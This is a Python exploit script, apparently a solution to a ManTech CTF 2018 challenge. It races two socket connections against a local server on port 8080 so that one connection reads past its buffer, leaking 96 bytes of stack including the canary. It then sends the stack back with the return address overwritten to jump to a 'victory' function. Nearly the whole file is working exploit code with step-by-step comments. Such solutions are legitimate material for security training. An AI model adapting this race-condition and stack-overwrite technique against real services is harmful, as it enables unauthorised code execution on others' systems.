##################################################################################################
'''
// @Project      ManTech CTF 2018 Challenge 1
// @Author       Saccharide && Cedar Ren
'''
##################################################################################################



# Impot time to pause current thread so that we can start another instance
import time
import socket
import struct


# Creating the main thread and helper thread to listen on port 8080
main_thread     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
helper_thread_1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


# Connect those sockets to localhost at port 8080
main_thread.connect(("localhost",8080))
helper_thread_1.connect(("localhost",8080))

# Send in initial request byte size of 16 to the server
# format '<q' indicates little endian and long long, which is 8 bytes
main_thread.send(struct.pack('<q',0x10))

# Send in first half of the target bytes (8 'A's, which is 8 bytes total)
main_thread.send(b'\x41'*8)

# Very important step, we are pausing the main thread for 1 second
# This will allow our helper thread to request byte size, and this new 
# byte size would allow our main thread to read more than it is first requested
time.sleep(1)


# After playing around and calculating rbp address, we found out that we need
# to request a total of 96 bytes to read all the important variable values (including the canary)
helper_thread_1.send(struct.pack('<q',0x60))

# We will close our first helper socket, since there is no need for it other than using it to allocate a larger buffer for main thread to read.
helper_thread_1.close()

# Finish sendin the rest of the 8 bytes in our main thread socket
main_thread.send(b'\x41'*8)

# Getting all the important values that we want to save for the next iteration, and we just need to override the return address at the last location to redirect to victory function.
stack = main_thread.recv(0x60)
stack_with_new_return = stack[:-0x08] + struct.pack('<q',0x0400d6d)

# Starting a second helper socket to request a larger buffer so we can override it with our main thread with new return address.
helper_thread_2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
helper_thread_2.connect(("localhost",8080))


main_thread.send(struct.pack('<q',0x10))
helper_thread_2.send(struct.pack('<q',0x60))
helper_thread_2.close()

main_thread.send(stack_with_new_return)

# Profit
ret = main_thread.recv(0x60)
print(ret)
